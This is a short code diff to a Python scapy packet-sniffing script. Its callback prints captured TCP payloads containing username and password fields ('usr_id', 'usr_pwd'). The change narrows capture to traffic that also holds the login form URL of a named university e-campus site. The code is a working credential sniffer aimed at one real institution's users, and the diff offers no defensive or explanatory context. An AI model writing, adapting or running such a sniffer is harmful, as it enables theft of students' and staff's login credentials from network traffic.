@@ -4,7 +4,7 @@ from scapy.all import*
 def showPacket(packet):
 	global i  
     	data = '%s' %(packet[TCP].payload)
-    	if 'usr_id' in data.lower() and 'usr_pwd' in data.lower():
+    	if 'usr_id' in data.lower() and 'usr_pwd' in data.lower() and 'http://ecampus.konkuk.ac.kr/ilos/main/member/login_form.acl' in data.lower():
         	print '%d @@@@@ [%s] @@@@@:\n %s\n' %(i, packet[IP].dst, data)
 		i+=1
   
